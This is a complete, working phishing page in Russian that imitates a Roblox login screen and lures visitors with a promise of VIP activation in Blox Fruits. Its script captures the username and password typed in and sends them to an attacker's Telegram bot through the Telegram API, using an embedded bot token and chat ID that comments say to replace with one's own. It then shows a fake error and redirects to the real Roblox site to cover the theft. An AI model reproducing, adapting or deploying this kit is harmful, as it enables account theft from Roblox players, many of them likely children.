<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Roblox — Вход</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1e2b; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #2a2f3f; padding: 40px; border-radius: 12px; width: 350px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        .login-box h1 { color: white; text-align: center; margin-bottom: 30px; }
        .login-box input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 8px; border: none; background: #3a3f55; color: white; font-size: 16px; }
        .login-box button { width: 100%; padding: 14px; background: #1e88e5; border: none; border-radius: 8px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
        .login-box button:hover { background: #0d6efd; }
        .vip-badge { text-align: center; color: #ffd700; margin-bottom: 20px; font-size: 18px; font-weight: bold; }
        .error { color: #ff8888; text-align: center; margin-top: 15px; }
    </style>
</head>
<body>
<div class="login-box">
    <div class="vip-badge">🎁 Активация VIP в Blox Fruits 🎁</div>
    <h1>Вход в Roblox</h1>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Имя пользователя" required>
        <input type="password" id="password" placeholder="Пароль" required>
        <button type="submit">Активировать VIP</button>
    </form>
    <div id="errorMsg" class="error"></div>
</div>
<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        // Отправка логина и пароля в Telegram
        var botToken = '8619754068:AAGUONRG4qwbbg-yNP8f2D55oPQh3mqQq30';   // ЗАМЕНИ НА ТОКЕН ТВОЕГО БОТА
        var chatId = '1788872314';   // ЗАМЕНИ НА ТВОЙ CHAT ID
        var message = 'Логин: ' + username + ' | Пароль: ' + password;
        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message));

        // Сообщение об ошибке и редирект на настоящий Roblox
        document.getElementById('errorMsg').innerHTML = 'Ошибка входа. Перенаправление...';
        setTimeout(function() {
            window.location.href = 'https://www.roblox.com/login?error=Неверный пароль';
        }, 1500);
    });
</script>
</body>
</html>
